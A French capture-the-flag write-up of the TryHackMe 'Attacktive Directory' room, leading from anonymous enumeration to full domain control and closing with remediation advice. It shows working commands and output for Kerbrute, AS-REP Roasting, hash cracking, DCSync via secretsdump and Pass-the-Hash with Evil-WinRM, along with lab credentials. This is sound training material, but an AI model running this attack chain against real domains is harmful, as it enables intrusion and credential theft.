---
titre: "Attacktive Directory"
description: "99 % des réseaux d'entreprise fonctionnent avec AD. Mais saurez-vous exploiter un contrôleur de domaine vulnérable ?"
resume: "On part d'un accès non authentifié sur le réseau pour aller jusqu'au compte Administrateur du domaine, en enchaînant des faiblesses de configuration classiques d'Active Directory. Ce write-up suit toute la chaîne, de l'énumération à la prise de contrôle du contrôleur de domaine, puis en tire les leçons en terme de défense."
date: "19.09.2026"
plateforme: "TryHackMe"
categorie: "Active Directory"
difficulte: "Medium"
lien: "https://tryhackme.com/room/attacktivedirectory"
---

## Objectif et contexte

Active Directory (AD) est le service d'annuaire de Microsoft. La plupart des réseaux d'entreprise s'en servent pour gérer l'authentification, les comptes et les autorisations. Le contrôleur de domaine (DC) en est le cœur. Il héberge la base d'annuaire et fait tourner les services d'authentification, notamment Kerberos et LDAP.

Ce challenge part d'un accès non authentifié sur le réseau et cible le compte Administrateur du domaine, en exploitant une chaîne de mauvaises configurations. C'est un cas classique. Il montre pourquoi la sécurité d'un DC tient autant à sa configuration qu'à ses correctifs.

## Méthodologie et chemin d'attaque

La compromission suit une chaîne logique où chaque étape débloque la suivante.

```text
Aucun accès
   |  nmap / enum4linux            -> cartographie des services, nom de domaine
   .
Énumération anonyme (null session)
   |  Kerbrute userenum            -> liste d'utilisateurs valides (svc-admin, backup…)
   .
Utilisateurs valides
   |  AS-REP Roasting (GetNPUsers) -> hash Kerberos de svc-admin (pas de pré-auth)
   |  Hashcat                      -> mot de passe en clair
   .
Compte svc-admin (utilisateur du domaine)
   |  smbclient sur le partage "backup" + décodage Base64
   .
Compte backup (droits de réplication AD)
   |  secretsdump.py (DCSync via DRSUAPI) -> tous les hash NTLM du domaine
   .
Hash NTLM de l'Administrateur
   |  Evil-WinRM -H (Pass-the-Hash)
   .
Contrôle total du domaine (Domain Admin)
```

La logique à retenir est qu'on n'a jamais eu besoin de "casser" le DC lui-même. On a enchaîné des faiblesses de configuration (pré-authentification désactivée, mot de passe faible, secret en clair sur un partage, privilèges excessifs sur un compte de service) jusqu'à la prise de contrôle.

## Énumération réseau (nmap)

### Vérification

```bash
ping -c 3 10.130.178.154
```

```text
64 bytes from 10.130.178.154: icmp_seq=1 ttl=128 time=0.344 ms
--- 10.130.178.154 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
```

Le `ttl=128` est caractéristique d'une machine Windows. Linux répond 64.

### Scan des services par défaut

```bash
nmap -Pn -sC -sV 10.130.178.154
```

| Option | Rôle |
| --- | --- |
| `-Pn` | Ne pas faire de ping préalable, utile si l'ICMP est filtré |
| `-sC` | Lance les scripts NSE par défaut (bannières, infos SSL) |
| `-sV` | Détecte les versions des services |

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|   NetBIOS_Domain_Name: THM-AD
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
```

Voici les ports les plus parlants.

| Port | Service | Ce qu'il révèle |
| --- | --- | --- |
| 53 | DNS | Le DC fait aussi office de serveur DNS |
| 88 | Kerberos | Signature d'un contrôleur de domaine et surface d'attaque Kerberos |
| 135 / 139 / 445 | RPC / NetBIOS / SMB | Énumération et partages de fichiers |
| 389 / 636 | LDAP / LDAPS | Annuaire AD |
| 3389 | RDP | Accès bureau distant |

Les scripts NSE donnent le domaine DNS `spookysec.local`, le domaine NetBIOS `THM-AD`, un OS (Windows Server 2019) et la signature SMB activée/requise.

### Scan complet des ports

```bash
nmap -Pn -p- --min-rate 2000 10.130.178.154
```

`-p-` scanne les 65535 ports, `--min-rate 2000` force au moins 2000 paquets par seconde. Ce scan confirme l'ouverture de WinRM (`5985`).

## Énumération SMB et LDAP (enum4linux)

`enum4linux-ng` interroge automatiquement les services (SMB, RPC, LDAP) en tentant une session nulle. C'est-à-dire une connexion anonyme sans identifiant.

```bash
enum4linux -A 10.130.178.154
```

```text
[+] Server allows authentication via username '' and password ''
[+] Long domain name is: spookysec.local
[+] Domain: THM-AD
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
```

Trois choses à retenir. Le serveur accepte l'authentification anonyme, ce qui rend l'énumération possible. Le SID du domaine est récupéré. Par contre, l'énumération des utilisateurs par RPC échoue car la session nulle ne suffit pas ici. Il faut changer d'approche et passer par Kerberos.

> [!note] Le TLD .local
> `.local` est un pseudo-domaine non valide publiquement. Microsoft l'a longtemps recommandé pour les domaines AD internes. C'est aujourd'hui une mauvaise pratique (conflits de résolution, pas de certificat public, fuites DNS). Le voir dans un scan est un indice d'un AD interne.

**Réponses :** outil -> `enum4linux`, domaine NetBIOS -> `THM-AD`, TLD invalide -> `.local`

## Énumération des utilisateurs via Kerberos (Kerbrute)

La session nulle ne permet pas de lister les comptes. On exploite alors une propriété de Kerberos. Lors d'une requête AS-REQ, le KDC répond différemment selon que l'utilisateur existe ou non (`KDC_ERR_C_PRINCIPAL_UNKNOWN` pour un compte inexistant, une autre réponse sinon).

`Kerbrute` exploite cette différence pour valider des noms d'utilisateur sans jamais soumettre de mot de passe. Il ne déclenche donc aucun verrouillage de compte, ce qui rend l'énumération discrète.

```bash
kerbrute userenum -d spookysec.local --dc 10.130.178.154 userlist.txt
```

```text
[+] VALID USERNAME:  svc-admin@spookysec.local     <- compte de service
[+] VALID USERNAME:  backup@spookysec.local        <- compte de sauvegarde
[...]
Done! Tested 73317 usernames (16 valid) in 14.917 seconds
```

Deux comptes ressortent. Le préfixe `svc-` de **`svc-admin`** indique un compte de service, souvent avec un mot de passe faible ou une mauvaise configuration Kerberos. **`backup`** est un compte de sauvegarde, potentiellement privilégié.

**Réponses :** commande -> `userenum`, compte notable -> `svc-admin`, autre -> `backup`

## AS-REP Roasting

### Le principe

L'AS-REP Roasting cible les comptes qui ont l'attribut "Do not require Kerberos pre-authentication" (`UF_DONT_REQUIRE_PREAUTH`).

Normalement, la pré-authentification oblige le client à prouver qu'il connaît le mot de passe avant que le KDC ne renvoie quelque chose. Il chiffre pour cela un horodatage avec la clé dérivée de son mot de passe. Quand cette pré-authentification est désactivée, n'importe qui peut demander un AS-REP. Le KDC renvoie alors une portion chiffrée avec la clé dérivée du mot de passe de l'utilisateur, que l'on peut attaquer par brute force hors ligne.

### Récupération du hash

```bash
GetNPUsers.py spookysec.local/ -dc-ip 10.130.178.154 \
  -usersfile usercible.txt -format hashcat -outputfile asrep.txt
```

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1d267d9c3ba315bdcc2da6e28d34d0e7$0fb416acb2...
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`svc-admin` a la pré-authentification désactivée, donc on obtient son hash `$krb5asrep$23$...`. `backup` n'est pas vulnérable à cette attaque. Le préfixe `$krb5asrep$23$` indique l'etype 23 (RC4-HMAC) qui est faible et rapide à casser.

### Cassage du hash

Le wiki Hashcat donne le mode **18200** (Kerberos 5, etype 23, AS-REP).

```bash
hashcat -m 18200 asrep.txt passwordlist.txt
```

```text
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

Le mot de passe de `svc-admin` est retrouvé : **`management2005`**.

> [!warning] Pas de brute force en ligne sur un DC
> En conditions réelles, on n'attaque pas un DC par brute force en ligne (verrouillage de comptes, bruit, déni de service). Ici, le hash se casse hors ligne, sans interaction avec la cible.

**Réponses :** compte interrogeable sans mot de passe -> `svc-admin`, type de hash -> `Kerberos 5 AS-REP etype 23`, mode -> `18200`, mot de passe -> `management2005`

## Post-exploitation SMB

Avec `svc-admin:management2005`, on énumère les partages en session authentifiée.

### Liste des partages

```bash
smbclient -L //10.130.178.154 -U 'spookysec.local/svc-admin'
```

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk                      <- partage non standard
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

`-L` liste les partages, `-U` indique l'utilisateur au format `domaine/utilisateur`. Six partages apparaissent. `ADMIN$` et `C$` renvoient `ACCESS_DENIED`, mais le partage **`backup`** qui n'est pas standard, attire l'attention.

### Récupération du fichier

```bash
smbclient //10.130.178.154/backup -U 'spookysec.local/svc-admin'
smb: \> ls
  backup_credentials.txt   A   48  ...
smb: \> more backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Le contenu ressemble à du Base64 (jeu de caractères, longueur multiple de 4). On le décode.

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
# -> backup@spookysec.local:backup2517860
```

Les identifiants du compte `backup` sont donc **`backup2517860`**.

> [!note] Base64 n'est pas du chiffrement
> C'est un encodage réversible. Stocker un identifiant encodé en Base64 n'apporte aucune protection.

**Réponses :** outil -> `smbclient`, option -> `-L`, partages -> `6`, partage -> `backup`, décodé -> `backup@spookysec.local:backup2517860`

## Élévation de privilèges : DCSync

### Pourquoi le compte backup est critique

`backup` est le compte de sauvegarde du DC. Pour répliquer et sauvegarder l'annuaire, il possède les droits de réplication AD (`DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`).

Ces droits permettent de demander au DC de renvoyer les données de l'annuaire, y compris les secrets, comme le ferait un autre contrôleur de domaine lors d'une synchronisation. C'est l'attaque DCSync. Au lieu de lire physiquement `NTDS.dit`, on demande au DC de nous répliquer les hash via le protocole MS-DRSR (DRSUAPI).

### Le dump

```bash
secretsdump.py 'spookysec.local/backup:backup2517860@10.130.178.154'
```

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash NTLM Administrateur>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
[...]
[*] Kerberos keys grabbed
```

La méthode "registre distant" échoue mais l'outil bascule sur DRSUAPI. Les droits de réplication de `backup` suffisent dans ce cas. Tous les hash NTLM du domaine sont compromis, dont celui de l'Administrateur.

> [!note] Le hash krbtgt
> Le hash `krbtgt` récupéré est particulièrement sensible. Il permet de forger des Golden Tickets. C'est pourquoi la compromission d'un DC est considérée comme totale.

### Le principe du Pass-the-Hash

En authentification NTLM, le serveur ne vérifie jamais le mot de passe en clair mais une preuve fondée sur le hash NT. Connaître le hash suffit donc pour s'authentifier, sans le casser. C'est le Pass-the-Hash.

**Réponses :** dump de `NTDS.DIT` -> `DRSUAPI`, attaque -> `Pass the Hash`, option Evil-WinRM -> `-H`

## Accès final : Pass-the-Hash (Evil-WinRM)

WinRM (5985) étant ouvert, on utilise Evil-WinRM en Pass-the-Hash pour obtenir un shell PowerShell Administrateur, sans connaître le mot de passe.

```bash
evil-winrm -i 10.130.178.154 -u Administrator -H <hash NTLM Administrateur>
```

```text
Evil-WinRM shell v4.1
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Chaque flag se lit avec `type` dans ce shell.

```powershell
*Evil-WinRM* PS C:\> type C:\Users\svc-admin\Desktop\user.txt.txt
TryHackMe{…}
*Evil-WinRM* PS C:\> type C:\Users\backup\Desktop\PrivEsc.txt
TryHackMe{…}
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt
TryHackMe{…}
```

Contrôle total du domaine atteint.

## Flags

Les trois flags se trouvent sur le bureau de chaque compte.

| Compte | Emplacement |
| --- | --- |
| `svc-admin` | `C:\Users\svc-admin\Desktop\user.txt.txt` |
| `backup` | `C:\Users\backup\Desktop\PrivEsc.txt` |
| `Administrator` | `C:\Users\Administrator\Desktop\root.txt` |

## Analyse, remédiation et leçons

Chaque étape correspond à une mauvaise configuration évitable. Voici comment un défenseur aurait pu casser la chaîne.

| Faiblesse exploitée | Remédiation |
| --- | --- |
| Énumération anonyme (null session, Kerbrute) | Durcir l'énumération anonyme, surveiller les pics d'AS-REQ (événement `4768`), alerter sur les nombreux `PRINCIPAL_UNKNOWN` |
| Pré-authentification Kerberos désactivée | Ne jamais cocher cet attribut et l'auditer sur tous les comptes |
| Mot de passe faible | Politique de mots de passe robustes et gMSA pour les comptes de service (mots de passe complexes, changés automatiquement) |
| Secret en clair (Base64) sur un partage | Ne jamais stocker d'identifiants dans un fichier, utiliser un coffre-fort (LAPS, gestionnaire de secrets), restreindre les ACL |
| Privilèges de réplication excessifs sur un compte non-DC | Seuls les DC ont besoin de `Get-Changes` et `Get-Changes-All`. Détecter DCSync via l'événement `4662` |
| Pass-the-Hash | Credential Guard, tiering administratif, surveillance de WinRM, réinitialisation du compte `krbtgt` après compromission |
| Domaine en `.local` | Préférer un sous-domaine d'un domaine possédé comme `ad.exemple.com` |

### Ce que ce challenge apprend

- **La sécurité d'AD est une affaire de configuration, pas seulement de correctifs.** Aucune CVE n'a été utilisée. Tout repose sur des attributs et des droits mal configurés.
- **Kerberos est une surface d'attaque à part entière**, de l'énumération d'utilisateurs à l'AS-REP Roasting.
- **Les comptes de service et de sauvegarde sont des cibles prioritaires** à cause de leurs mots de passe faibles et de leurs privilèges trop importants.
- **Le moindre privilège est la contre-mesure la plus puissante.** Sans les droits de réplication sur `backup`, la chaîne s'arrêtait avant le DCSync.
- **Un hash volé est un identifiant utilisable tel quel** avec NTLM et Kerberos.
